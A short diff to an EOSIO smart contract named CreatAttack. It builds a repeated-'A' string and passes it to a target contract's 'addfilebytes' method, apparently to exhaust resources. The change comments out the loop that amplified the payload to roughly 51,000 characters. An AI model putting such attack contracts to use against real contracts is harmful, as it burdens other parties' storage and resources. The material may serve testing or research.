@@ -27,10 +27,10 @@ class [[eosio::contract]] CreatAttack : public eosio::contract {
             name targetContract = TC;
             name targetMethod = name("addfilebytes");
             std::string A = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; //A*50
-            for ( int i = 0; i < 10; i++)
-            {
-                A = A+A;
-            }
+            //for ( int i = 0; i < 10; i++)
+            //{
+            //    A = A+A;
+            //}
             auto argu = std::make_tuple(
                     uint64_t(idx),
                     A, 
